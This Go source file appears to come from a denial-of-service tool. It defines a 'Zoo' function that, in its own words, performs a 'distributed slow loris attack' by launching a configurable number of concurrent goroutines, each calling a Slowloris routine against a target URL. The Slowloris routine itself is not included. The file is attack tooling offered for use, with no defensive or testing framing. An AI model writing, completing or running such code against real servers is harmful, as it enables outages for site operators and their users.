package main

import (
	"context"
	"fmt"
	"sync"
	"time"
)

// Config holds configuration available for constructing a slowloris zoo.
type Config struct {
	URL      string
	Count    int64
	Interval time.Duration
	Timeout  time.Duration
}

// Zoo is a function that can perform distributed slow loris attack based on
// the given parameters.
func Zoo(c Config) error {
	var ctx context.Context
	ctx = context.Background()
	if c.Timeout != 0 {
		ctx, _ = context.WithTimeout(ctx, c.Timeout)
	}

	wg := sync.WaitGroup{}
	for i := int64(0); i < c.Count; i++ {
		wg.Add(1)
		go func(index int64) {
			defer wg.Done()
			fmt.Printf("slowloris %d\n", index)
			if err := Slowloris(ctx, index, c.Interval, c.URL); err != nil {
				fmt.Printf("slowloris %d received err: %s\n", index, err)
				return
			}
		}(i)
	}

	wg.Wait()
	return nil
}